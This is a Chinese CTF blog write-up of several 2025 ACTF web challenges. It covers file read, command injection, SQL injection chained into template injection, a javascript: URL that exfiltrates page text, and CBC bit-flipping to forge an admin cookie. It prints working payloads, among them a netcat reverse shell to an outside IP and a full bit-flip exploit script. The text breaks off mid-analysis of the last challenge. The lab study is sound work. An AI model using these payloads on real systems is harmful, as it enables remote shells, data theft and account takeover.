---
title: "2025 ACTF Web 复现"
source: "https://changeyourway.github.io/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"
author:
  - "[[妙尽璇机]]"
published: 2025-04-30
created: 2026-06-09
description: "2025 ACTF Web WP感谢 F12 师傅提供的源码和指导，感谢其他 NK 师傅的帮助。 下面的 wp 全部为自己搭环境赛后复测的，所以没有 flag ，仅展示过程。（本人因为某些原因错过了本场比赛，同时又决定现在开始好好打 CTF ） ACTF upload核心考点：文件读取，命令执行 由于本题我在 Windows 上复现环境，部分地方可能与实际比赛不同。 进入主页，看到如下画面，提示"
tags:
  - "clippings"
---
---
title: "2025 ACTF Web 复现"
source: "https://changeyourway.github.io/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"
author: "[[妙尽璇机]]"
published: "2025-04-30T12:00:00+08:00"
created: "2026-06-09T21:06:37+08:00"
description: "2025 ACTF Web WP感谢 F12 师傅提供的源码和指导，感谢其他 NK 师傅的帮助。 下面的 wp 全部为自己搭环境赛后复测的，所以没有 flag ，仅展示过程。（本人因为某些原因错过了本场比赛，同时又决定现在开始好好打 CTF ） ACTF upload核心考点：文件读取，命令执行 由于本题我在 Windows 上复现环境，部分地方可能与实际比赛不同。 进入主页，看到如下画面，提示"
tags: [clippings]
---

# 2025 ACTF Web 复现

## 2025 ACTF Web WP

感谢 [F12](https://www.cnblogs.com/F12-blog) 师傅提供的源码和指导，感谢其他 NK 师傅的帮助。

下面的 wp 全部为自己搭环境赛后复测的，所以没有 flag ，仅展示过程。（本人因为某些原因错过了本场比赛，同时又决定现在开始好好打 CTF ）

### ACTF upload

核心考点：文件读取，命令执行

由于本题我在 Windows 上复现环境，部分地方可能与实际比赛不同。

进入主页，看到如下画面，提示 “无需注册” ：

![](https://changeyourway.github.io/images/image-20250427215500-a64z3wa.png)

随便输入一个普通用户名 test:test ，来到文件上传界面：

![](https://changeyourway.github.io/images/image-20250427215540-82cas62.png)

随便选择一个文件上传，会跳转到这个图片对应的路径：

![](https://changeyourway.github.io/images/image-20250427215628-iaxeb0t.png)

根据路径中的?file\_path=xxx 猜测存在任意文件读取，响应头里写了是 python 环境，这边是通过读取 app/app.py 获取到源码（这是 python 服务器启动文件的默认路径）我本地的文件名叫 ACTF upload.py ：

![](https://changeyourway.github.io/images/image-20250427220235-xrthwsm.png)

读取以后发现返回 base64 编码的数据，这边解码一下，发现就是源码：

![](https://changeyourway.github.io/images/image-20250427220517-xm1onyv.png)
```
import uuid
import os
import hashlib
import base64
from flask import Flask, request, redirect, url_for, flash, session

app = Flask(__name__)
# app.secret_key = os.getenv('SECRET_KEY')
app.secret_key = 'd6d3b6d4f54e434a9e3a82b7c987d8a7c9f1b2e5'  # 40位十六进制字符串

@app.route('/')
def index():
    if session.get('username'):
        return redirect(url_for('upload'))
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin':
            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
                session['username'] = username
                return redirect(url_for('index'))
            else:
                flash('Invalid password')
        else:
            session['username'] = username
            return redirect(url_for('index'))
    else:
        return '''
        <h1>Login</h1>
        <h2>No need to register.</h2>
        <form action="/login" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <input type="submit" value="Login">
        </form>
        '''

@app.route('/upload', methods=['POST', 'GET'])
def upload():
    if not session.get('username'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        f = request.files['file']
        file_path = str(uuid.uuid4()) + '_' + f.filename
        f.save('./uploads/' + file_path)
        return redirect(f'/upload?file_path={file_path}')
    
    else:
        if not request.args.get('file_path'):
            return '''
            <h1>Upload Image</h1>
            
            <form action="/upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" value="Upload">
            </form>
            '''
            
        else:
            file_path = './uploads/' + request.args.get('file_path')
            if session.get('username') != 'admin':
                with open(file_path, 'rb') as f:
                    content = f.read()
                    b64 = base64.b64encode(content)
                    return f'<img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image">'
            else:
                os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                # with open(f'/tmp/{file_path}.b64', 'r') as f:
                #     return f'<img src="data:image/png;base64,{f.read()}" alt="Uploaded Image">'
                return 'Sorry, but you are not allowed to view this image.'
                
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

拿到源码开始审计，当访问 /upload 路由且 session 为 admin 用户时会执行一个系统命令： `base64 {file_path} > /tmp/{file_path}.b64`

admin 的密码经 sha256 加密后的值为 32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0 。在解码网站上碰撞一下即可得到明文：

示例网站： [SHA256 在线解密 - 轻松逆转 SHA256 哈希值](https://iotools.cloud/zh/tool/sha256-decrypt/)

![](https://changeyourway.github.io/images/image-20250427221227-v8xlshu.png)

于是知道 admin 账户的密码为 backdoor 。回到登录界面进行登录，登录完成进到上传文件界面，直接抓包开始拼接路径，应用 admin 的 Cookie ，访问路径 `/upload?file_path=` ，后面接我们拼接的命令。由于我是在 Windows 上，拼接的命令为：

```
2>nul & chcp 65001 > nul & ping kjtudxclis.zaza.eu.org &::
```

Linux 上应该为 ` ;ping kjtudxclis.zaza.eu.org;#` 之类的。

注意这里发请求的时候 & 也要 url 编码：

![](https://changeyourway.github.io/images/d9efb16b4c472d4fa989cc8f2f9074b3-20250427221636-ha71ahf.png) ![](https://changeyourway.github.io/images/d097b298d1494e2ba9421419b6b65c80-20250427221644-g1nr27p.png)

这里也是命令执行成功。这里似乎没有回显，考虑反弹 shell 。

这里我看了 nk 的 [wp](https://mp.weixin.qq.com/s/omVLuWVSe9cQwdsAWONuUA) ，是通过读取环境变量拿到了 Cookie 的加密密钥，伪造了管理员的 Cookie：

```
?file_path=../../../../../../../../proc/self/environ    # 读取环境变量
key=S3cRetK3y    # 加密密钥
flask-unsign --sign --secret S3cRetK3y --cookie '{"username": "admin"}'     # 伪造管理员Cookie
```

不得不说还是很强的。

### Excellent-Site

核心考点：SQL 注入，SSTI

这题给了附件，代码如下：

```
import smtplib 
import imaplib
import email
import sqlite3
from urllib.parse import urlparse
import requests
from email.header import decode_header
from flask import *

app = Flask(__name__)

def get_subjects(username, password):
    imap_server = "ezmail.org"
    imap_port = 143
    try:
        mail = imaplib.IMAP4(imap_server, imap_port)
        mail.login(username, password)
        mail.select("inbox")
        status, messages = mail.search(None, 'FROM "admin@ezmail.org"')
        if status != "OK":
            return ""
        subject = ""
        latest_email = messages[0].split()[-1]
        status, msg_data = mail.fetch(latest_email, "(RFC822)")
        for response_part in msg_data:
            if isinstance(response_part, tuple):
                msg = email.message_from_bytes(response_part  [1])
                subject, encoding = decode_header(msg["Subject"])  [0]
                if isinstance(subject, bytes):
                    subject = subject.decode(encoding if encoding else 'utf-8')
        mail.logout()
        return subject
    except:
        return "ERROR"

def fetch_page_content(url):
    try:
        parsed_url = urlparse(url)
        if parsed_url.scheme != 'http' or parsed_url.hostname != 'ezmail.org':
            return "SSRF Attack!"
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "ERROR"
    except:
        return "ERROR"

@app.route("/report", methods=["GET", "POST"])
def report():
    message = ""
    if request.method == "POST":
        url = request.form["url"]
        content = request.form["content"]
        smtplib._quote_periods = lambda x: x
        mail_content = """From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: {url}\r\n\r\n{content}\r\n.\r\n"""
        try:
            server = smtplib.SMTP("ezmail.org")
            mail_content = smtplib._fix_eols(mail_content)
            mail_content = mail_content.format(url=url, content=content)
            server.sendmail("ignored@ezmail.org", "admin@ezmail.org", mail_content)
            message = "Submitted! Now wait till the end of the world."
        except:
            message = "Send FAILED"
    return render_template("report.html", message=message)

@app.route("/bot", methods=["GET"])
def bot():
    requests.get("http://ezmail.org:3000/admin")
    return "The admin is checking your advice(maybe)"

@app.route("/admin", methods=["GET"])
def admin():
    ip = request.remote_addr
    if ip != "127.0.0.1":
        return "Forbidden IP"
    subject = get_subjects("admin", "p@ssword")
    if subject.startswith("http://ezmail.org"):
        page_content = fetch_page_content(subject)
        return render_template_string(f"""
                <h2>Newest Advice(from myself)</h2>
                <div>{page_content}</div>
        """)
    return ""

@app.route("/news", methods=["GET"])
def news():
    news_id = request.args.get("id")

    if not news_id:
        news_id = 1

    conn = sqlite3.connect("news.db")
    cursor = conn.cursor()

    cursor.execute(f"SELECT title FROM news WHERE id = {news_id}")
    result = cursor.fetchone()
    conn.close()

    if not result:
        return "Page not found.", 404
    return result[0]

@app.route("/")
def index():
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```

大致可以看出来是解析邮件导致的模板注入，/news 这里有 SQL 注入

需要注意的是，这里的域名 ezmail.org 实际上指向本地，应该是配置了 host ：

```
127.0.0.1  ezmail.org
```

搭环境要注意这一点。所以这里访问 /bot 就能够访问本地的 /admin 路径，能够越过对本地 IP 的限制。

那么我们的思路就很简单了，通过 /report 发送携带 SSTI poc 的邮件，通过 /bot 去本地访问 /admin 路径解析 poc 造成注入。

为了正确地处理邮件的收发，我们还需要在本地搭建一个邮件服务器：

```
# 使用 Docker 快速部署邮件服务器
docker run -d --name ctfmail4 \
  -p 25:25 \
  -e SMTP_SERVER=ezmail.org \
  -e SMTP_USERNAME=admin@ezmail.org \
  -e SMTP_PASSWORD='p@ssword' \
  -e SERVER_HOSTNAME=mail.ezmail.org \
  juanluisbaptiste/postfix:latest
```
![](https://changeyourway.github.io/images/image-20250430105925-vvvfyfi.png)

容器启动。

首先我们可以来测试一下这里的 SQL 注入：

```
?id=-1+union+select+'1'
```
![](https://changeyourway.github.io/images/image-20250430115655-rl9mjrl.png)

分析 /admin ，这里会去请求邮件 Subject 部分的 url ，调用 fetch\_page\_content 方法：

![](https://changeyourway.github.io/images/image-20250430150231-4jlxqz2.png)

跟进 fetch\_page\_content 方法：

![](https://changeyourway.github.io/images/image-20250430150340-mz1is0n.png)

检测邮件的协议是否为 http ，主机名是否为 ezmail.org ，如果是则会去请求 url ，并返回请求体。

分析 /report ，这里是发送邮件的部分，输入的 url 参数会直接被拼接进 Subject 部分：

![](https://changeyourway.github.io/images/image-20250430150515-64ipzcn.png)

分析 /bot ，这个路由访问后会去请求 `http://ezmail.org:3000/admin` ，结合当前环境，服务器同样开在 3000 端口并且同样有 /admin 路径来看，ezmail.org 就是服务器本身：

![](https://changeyourway.github.io/images/image-20250430150615-jbaespc.png) ![](https://changeyourway.github.io/images/image-20250430150644-c9zm5y4.png)

结合前面的 SQL 注入的请求体来看，思路如下：

1. 请求 /report ，携带参数 url 为 SQL 注入回显 SSTI poc 的链接
2. 访问 /bot -> 请求 /admin -> 请求 url 链接并获取响应体 -> 模板注入

我们可以让SQL注入部分在请求体中回显想要的 poc：

```
/news?id=-1+union+select+"{{config.__class__.__init__.__globals__['os'].popen('netcat%2061.139.2.128%208888%20-e%20/bin/bash').read()}}"
```
![](https://changeyourway.github.io/images/image-20250430151245-990ljrr.png)

这边发 /report 之后发 /bot 实际没去请求

```
http://ezmail.org:3000/news?id=-1+union+select+"{{config.__class__.__init__.__globals__['os'].popen('netcat%2061.139.2.128%208888%20-e%20/bin/bash').read()}}"
```

这个链接，看了别人的 wp 发现是漏看了一个点。

/admin 这里获取 Subject 头的时候调用了 get\_subjects 方法，这里面只接收来自 [admin@ezmail.org](mailto:admin@ezmail.org) 的邮件（检索邮件中是否包含 FROM “ [admin@ezmail.org](mailto:admin@ezmail.org) “ 字符串 ）：

![](https://changeyourway.github.io/images/image-20250430152704-v6sdd0x.png)

而 /report 中是以 [ignored@ezmail.org](mailto:ignored@ezmail.org) 去发邮件的。

我尝试直接自己写个代码去发邮件，用代码中的用户名密码去登录，发现会遇到一些问题，比如这个邮件服务器，虽然已经能猜到就是本机，但端口号其实是不知道的，就算知道端口号（盲猜 25），也还是会发送失败（后来发现是邮件服务器的原因），下面是我的代码：

```
import smtplib

smtplib._quote_periods = lambda x: x
mail_content = """From: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: {url}\r\n\r\n{content}\r\n.\r\n"""
url = "http://ezmail.org/news?id=-1+union+select+\\\"{{config.__class__.__init__.__globals__['os'].popen('netcat%2061.139.2.128%208888%20-e%20/bin/bash').read()}}\\\""
try:
    # 改用加密连接方式
    server = smtplib.SMTP_SSL("61.139.2.128", 25)
    # server = smtplib.SMTP("61.139.2.128", 25)
    server.login('admin', 'p@ssword')  # 添加身份验证
    server.set_debuglevel(1)  # 添加SMTP协议调试信息
    mail_content = smtplib._fix_eols(mail_content)
    mail_content = mail_content.format(url=url, content="content")
    server.sendmail("admin@ezmail.org", "admin@ezmail.org", mail_content)
    print("Submitted! Now wait till the end of the world.")
except:
    print("Send FAILED")
```

那我们就假定这个 ezmail.org 只有它本地能访问，尝试别的办法。既然只检查邮件中是否包含 FROM “ [admin@ezmail.org](mailto:admin@ezmail.org) “ 字符串，我们可以自己伪造一个 FROM 头，这样即便有双重 FROM 头，它也都会去读取。

paylaod 大致长这样：

```
http://ezmail.org/news?id=-1+union+select+"{{config.__class__.__init__.__globals__['os'].popen('netcat%2061.139.2.128%208888%20-e%20/bin/bash').read()}}"\r\nFrom:%20admin@ezmail.org
```

这边看了我的邮件服务器还是有问题：

![](https://changeyourway.github.io/images/image-20250430171753-rwuw5px.png)

算了，毁灭吧。

### eznote

核心考点：JavaScript 伪协议

这道题给了附件，源码如下：

app.js

```
const express = require('express')
const session = require('express-session')
const { randomBytes } = require('crypto')
const fs = require('fs')
const spawn = require('child_process')
const path = require('path')
const { visit } = require('./bot')
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const DOMPurify = createDOMPurify(new JSDOM('').window);

const LISTEN_PORT = 3000
const LISTEN_HOST = '0.0.0.0'

const app = express()

app.set('views', './views')
app.set('view engine', 'html')
app.engine('html', require('ejs').renderFile)

app.use(express.urlencoded({ extended: true }))

app.use(session({
    secret: randomBytes(4).toString('hex'),
    saveUninitialized: true,
    resave: true,

}))

app.use((req, res, next) => {
    if (!req.session.notes) {
        req.session.notes = []
    }
    next()
})

const notes = new Map()

setInterval(() => { notes.clear() }, 60 * 1000);

function toHtml(source, format){
    if (format == undefined) {
        format = 'markdown'
    }
    let tmpfile = path.join('notes', randomBytes(4).toString('hex'))
    fs.writeFileSync(tmpfile, source)
    let res = spawn.execSync(\`pandoc -f ${format} ${tmpfile}\`).toString()
    // fs.unlinkSync(tmpfile)
    return DOMPurify.sanitize(res)
}

app.get('/ping', (req, res) => {
    res.send('pong')
})

app.get('/', (req, res) => {
    res.render('index', { notes: req.session.notes })
})

app.get('/notes', (req, res) => {
    res.send(req.session.notes)
})

app.get('/note/:noteId', (req, res) => {
    let { noteId } = req.params
    if(!notes.has(noteId)){
        res.send('no such note')
        return
    } 
    let note = notes.get(noteId)
    res.render('note', note)
})

app.post('/note', (req, res) => {
    let noteId = randomBytes(8).toString('hex')
    let { title, content, format } = req.body
    if (!/^[0-9a-zA-Z]{1,10}$/.test(format)) {
        res.send("illegal format!!!")
        return
    }
    notes.set(noteId, {
        title: title,
        content: toHtml(content, format)
    })
    req.session.notes.push(noteId)
    res.send(noteId)
})

app.get('/report', (req, res) => {
    res.render('report')
})

app.post('/report', async (req, res) => {
    let { url } = req.body
    try {
        await visit(url)
        res.send('success')
    } catch (err) {
        console.log(err)
        res.send('error')
    }
})

app.listen(LISTEN_PORT, LISTEN_HOST, () => {
    console.log(\`listening on ${LISTEN_HOST}:${LISTEN_PORT}\`)
})
```

bot.js

```
const puppeteer = require('puppeteer')
const process = require('process')
const fs = require('fs')

const FLAG = (() => {
    let flag = 'flag{test}'
    if (fs.existsSync('flag.txt')){
        flag = fs.readFileSync('flag.txt').toString()
        fs.unlinkSync('flag.txt')
    } 
    return flag
})()

const HEADLESS = !!(process.env.PROD ?? false)

const sleep = (sec) => new Promise(r => setTimeout(r, sec * 1000))

async function visit(url) {
    let browser = await puppeteer.launch({
        headless: HEADLESS,
        // executablePath: '/usr/bin/chromium',
        args: ['--no-sandbox'],
    })
    let page = await browser.newPage()

    await page.goto('http://localhost:3000/')

    await page.waitForSelector('#title')
    await page.type('#title', 'flag', {delay: 100})
    await page.type('#content', FLAG, {delay: 100})
    await page.click('#submit', {delay: 100})

    await sleep(3)
    console.log('visiting %s', url)

    await page.goto(url)
    await sleep(30)
    await browser.close()
}

module.exports = {
    visit
}
```

bot.js 中，输入 url ，显示 flag ：

![](https://changeyourway.github.io/images/image-20250427152220-g5dx1rr.png)

这里的 flag 是从本地的 flag.txt 文件中读取的，并且读取一次就会删除：

![](https://changeyourway.github.io/images/image-20250428160858-2sofib1.png)

对应的路由为 /report ，POST 请求体为 url=xxx ：

![](https://changeyourway.github.io/images/image-20250427152353-dw61hzh.png)

什么意思呢？访问 /report 路由并输入一个 URL 链接，bot 就会从本地的 flag.txt 文件中读取 flag ，然后跳转到主页去创建这么一个笔记，笔记会返回一个 nodeId ，拿到这个 nodeId 去进行访问，能够看到笔记的内容。

由于这个过程是在服务器上进行的，所以本题核心就是获取这个 nodeId 。

在创建笔记时，我们输入的内容会被转化为 html ：

![](https://changeyourway.github.io/images/image-20250428163741-j22h2ww.png)

这里使用 `DOMPurify.sanitize` 对代码进行了过滤，在 package.json 文件中能看到 DOMPurify 的版本为 3.2.3 ，对于这个版本的默认配置还没有什么绕过方法：

![](https://changeyourway.github.io/images/image-20250427143310-uscug04.png)

唯一可控的就是 url 了。考虑执行 JavaScript 代码，只需要以下 poc ：

```
javascript:fetch('http://ip:port/?flag='+(document.body.innerText))
```

将 HTML body 部分的内容拼接到 [http://ip:port/?flag=](http://ip:port/?flag=) 后面，并请求 ip:port 。这样就能获取到 nodeId 了。

ip:port 为攻击者公网服务器的 ip 和端口。这边开启监听，就收到了 nodeId ：

![](https://changeyourway.github.io/images/image-20250428170437-nin07ly.png)

有了 noteId 即可去访问 /note/noteId 查看 flag 。

### not so web 1

核心考点：CBC 字节翻转攻击，SSTI

不全是 web ，还有密码学~

在 /register 路径下注册以后登录就给源码，在 /home 路径。

![](https://changeyourway.github.io/images/image-20250428222007-lofglgi.png)
```
import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
)

app = Flask(__name__)
app.secret_key = KEY

# @dataclass(kw_only=True)
@dataclass()
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie: str) -> bool:
    if not cookie:
        return False

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        return False

    if len(cookie_encrypted) < 32:
        return False

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        cookie_json = cipher.decrypt(padded)
    except ValueError:
        return False

    try:
        _ = json.loads(cookie_json)
    except Exception:
        return False

    return True

def parse_cookie(cookie: str) -> Tuple[bool, str]:
    if not cookie:
        return False, ""

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        return False, ""

    if len(cookie_encrypted) < 32:
        return False, ""

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(padded)
        cookie_json_bytes = unpad(decrypted, 16)
        cookie_json = cookie_json_bytes.decode()
    except ValueError:
        return False, ""

    try:
        cookie_dict = json.loads(cookie_json)
    except Exception:
        return False, ""

    return True, cookie_dict.get("name")

def generate_cookie(user: APPUser) -> str:
    cookie_dict = asdict(user)
    cookie_json = json.dumps(cookie_dict)
    cookie_json_bytes = cookie_json.encode()
    iv = os.urandom(16)
    padded = pad(cookie_json_bytes, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    if not valid or not current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    if not user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">Welcome, %s !</h2>
        <div class="text-center">
            Your payload: %s
        </div>
        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">server code (encoded)</h2>
        <div class="text-center" style="word-break:break-all;">
        {%% raw %%}
            %s
        {%% endraw %%}
        </div>
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()
```

在源码中我们可以看到当访问 /home 路由时，如果当前用户为 admin ，会直接对请求参数 payload 进行模板注入。而其他用户只会返回 base64 编码的源码。

注意到本题给出了加密和解密 Cookie 的代码，加密方式为 AES ，于是我们想伪造一个管理员 Cookie ，查看 Cookie 的生成过程：

![](https://changeyourway.github.io/images/image-20250428224859-hhs0w1q.png)

这边是调用 generate\_cookie 传入一个用户名来生成的，跟进去看看：

![](https://changeyourway.github.io/images/image-20250428225124-yoea542.png)

具体步骤：

1. 使用 asdict 将用户对象转为字典 cookie\_dict ，这样包含了 name、password\_raw 和 register\_time 三个字段。
2. 将 cookie\_dict 序列化为 JSON 字符串 cookie\_json
3. 将 cookie\_json 编码为字节 cookie\_json\_bytes 。
4. 生成 16 字节的随机 IV（初始向量：Initialization Vector)，这是 CBC 模式所必需的，可以增加每次加密的随机性。
5. 对 JSON 字节进行 PKCS#7 填充，确保数据长度符合 AES 块大小的倍数。
6. 使用 AES-CBC 模式创建加密器 cipher ，用 KEY 和 IV 加密填充后的数据。
7. 调用 cipher.encrypt 加密并得到密文。
8. 将 IV 和密文拼接，进行 Base64 编码，转为字符串返回。

这里既然使用 CBC 模式加密，那么很容易就想到 CBC 字节翻转攻击：能够在不知道 key 的情况下，通过修改密文或 IV ，来控制输出明文为自己想要的内容。

Cookie 的解码过程又是怎样的呢？在 /home 路由，调用 parse\_cookie 进行解码：

![](https://changeyourway.github.io/images/image-20250428230301-ne4uvp8.png)

跟进 parse\_cookie 看看：

![](https://changeyourway.github.io/images/image-20250428230342-6uk72oc.png)
1. 先对 Cookie 进行 base64 解码，获取到解码后的数据 cookie\_encrypted 。
2. 从 cookie\_encrypted 中获取前 16 位作为初始向量 IV ，其余位作为填充数据 padded
3. 创建加密器 cipher ，用 key 和 iv 对填充数据 padded 进行解密，获得解密后的数据 decrypted
4. 将 decrypted 解包后获得字节数据 cookie\_json\_bytes
5. 将 cookie\_json\_bytes 解码得到 json 数据 cookie\_json
6. 从 cookie\_json 获取 name 键对应的值。

那么既然我们能够控制 Cookie ，我们就能够控制初始向量 iv 和填充数据 padded ，满足 CBC 字节翻转所需要的条件。而我们的目的是将明文 json 数据中的 name 键值替换为 admin 。

首先我们需要知道明文 json 是个什么格式，捕捉一个普通用户的 Cookie ，应用同样的解码方式进行解码：

```
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from secret import KEY

cookie = "XKfhgnDNl8M3R4MSAXk7b1HqfisYeSczf24fu0C3XbMwjrwpGwH74cun8vj9wiT/95+NMK3zIcb0xkgAe1T9zB0LsUsOVCFC0wWbTwKlmhgl3U1dxr/RevqkJy7WFVRV"
cookie_encrypted = base64.b64decode(cookie, validate=True)
iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
cipher = AES.new(KEY, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(padded)
cookie_json_bytes = unpad(decrypted, 16)
cookie_json = cookie_json_bytes.decode()
print(cookie_json)
```
![](https://changeyourway.github.io/images/image-20250428234207-prbi6qf.png)

可以看到明文的 json 格式为：

```
{"name": "miao", "password_raw": "123", "register_time": 1745853766}
```

为了更方便地进行逐字节翻转，我们注册一个长度为 5 用户名（与 “admin” 长度一致），拿到 Cookie ，其解码后的明文为：

```
{"name": "miaoa", "password_raw": "123", "register_time": 1745855336}
```

于是我们写出如下 poc ，通过 CBC 字节翻转攻击获取明文 name 为 admin 的 Cookie ，并测试 Cookie 是否可用：

```
from Crypto.Cipher import AES
import requests
import base64
import binascii

# 1. 获取普通用户的 Cookie（替换为实际 cookie）
original_cookie = "Lm/NsRCXQ6vrFDcclnufREw/txBSmvYS722VCmpFVtrG/IDVG+GuTETQdLYxCjIHk8ihEdsgg35P3lKWaHrF3sWl0bCwEpbkdMUHJmzdssyI7l9qnJx31PNT17eSV8m+"

# 2. 解码并拆分密文
encrypted = base64.b64decode(original_cookie)
iv = bytearray(encrypted[:16])
ciphertext = encrypted[16:]

# 3. 计算 name 字段的精确偏移（根据已知 JSON 结构）
name_start = 10  # "m" 的偏移位置（第 11 字节）

# 4. 定义翻转目标
original_name = "miaoa"
target_name = "admin"

# 5. 执行位翻转攻击
for i in range(len(target_name)):
    # 计算当前字符的异或差值
    orig_char = ord(original_name[i])
    target_char = ord(target_name[i])
    xor_diff = orig_char ^ target_char

    # 修改 IV 中对应的字节
    iv[name_start + i] ^= xor_diff

# 6. 生成攻击 Cookie
modified_cookie = base64.b64encode(iv + ciphertext).decode()

# 7. 验证攻击
resp = requests.get("http://localhost:5000/home",
                    cookies={"jwbcookie": modified_cookie})
print("Admin Check:", "Welcome, admin" in resp.text)
print("Cookie 为", modified_cookie)
```

下面是运行结果：

![](https://changeyourway.github.io/images/image-20250428235254-e7inl94.png)

说明 Cookie 可用。

拿到管理员 Cookie 以后去用该 Cookie 去访问 /home 路径，并带上我们的 payload 参数（SSTI 攻击代码）即可攻击成功：

![](https://changeyourway.github.io/images/image-20250429000645-ep9idya.png)

### not so web 2

核心考点：逻辑漏洞，SSTI

这题跟前面一道的代码很相似，只是加密方式不同。同样是注册登录就给源码。

/login 调用 generate\_cookie 来生成 Cookie：

![](https://changeyourway.github.io/images/image-20250429095913-uy2k54j.png)

generate\_cookie ：

![](https://changeyourway.github.io/images/image-20250429095948-sgngb1o.png)

主要有以下步骤：

1. 创建了一个包含用户名和登录时间的字典 msg\_dict
2. 将 msg\_dict 转换为 JSON 字符串 msg\_str
3. 将 msg\_str 编码成字节流 msg\_str\_bytes
4. 用 SHA256 生成 msg\_str\_bytes 的哈希值 msg\_hash
5. 使用 PKCS1\_v1\_5 方案和私钥对哈希值进行签名，得到 sig。这里要注意的是，私钥是 RSA 的，所以签名过程符合 RSA-PKCS1v1.5 的标准
6. 签名后的结果 sig 被转换成十六进制字符串 sig\_hex
7. 将消息字符串 msg\_str 和签名 sig\_hex 拼接起来，中间用&符号连接，形成 packed
8. 将 packed base64 编码形成 Cookie

可以看到加密是采用 SHA256 获取 hash 值，再用 RSA 私钥进行签名。

/home 调用 parse\_cookie 解密 Cookie ：

![](https://changeyourway.github.io/images/image-20250429101220-h0omj17.png)

parse\_cookie：

![](https://changeyourway.github.io/images/image-20250429101243-8kxvety.png)

主要有以下步骤：

1. 对 cookie 进行 Base64 解码
2. 根据 & 分割成原始 json 数据 msg\_str 和经签名的 hash 值十六进制 sig\_hex
3. 将 JSON 字符串 msg\_str 解析为 Python 字典 msg\_dict，用来获取用户名等信息
4. 再次将 JSON 字符串 msg\_str 编码成字节流 msg\_str\_bytes
5. 获取字节流 msg\_str\_bytes 的 SHA256 hash 值 msg\_hash
6. 将十六进制 sig\_hex 转换为原始的签名数据 sig
